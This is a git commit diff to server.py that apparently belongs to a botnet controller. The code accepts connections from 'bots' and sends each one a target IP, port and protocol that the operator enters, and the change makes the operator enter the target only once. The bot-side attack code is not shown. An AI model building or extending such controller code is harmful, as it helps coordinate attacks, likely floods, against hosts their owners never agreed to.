fdcb95ed7f8a691ac9447d986c69e06171399237
KLVSPL <101648648+KLVSPL@users.noreply.github.com>
2022-05-02 08:28:37 +0800

    Update server.py

--- server.py
+++ server.py
@@ -12,26 +12,11 @@ proto = str("")
 x = True
 while True:
     if x == True:
-        c, addr = s.accept()
-        print(addr, ":Bot connected")
         hostname = input("IP:")
-        c.send(hostname.encode())
-        print(addr, "Bot Got Hostname/IP")
-        c.close()
-
         hostport = input("Port:")
-        c, addr = s.accept()
-        c.send(hostport.encode())
-        print(addr, "Bot Got Port")
-        c.close()
-
         proto = input("Protocol:")
-        c, addr = s.accept()
-        c.send(proto.encode())
-        print(addr, "Bot Got Protocol")
-        c.close()
-
         x = False
+
     c, addr = s.accept()
     c.send(hostname.encode())
     print(addr, "Bot Got Hostname/IP")
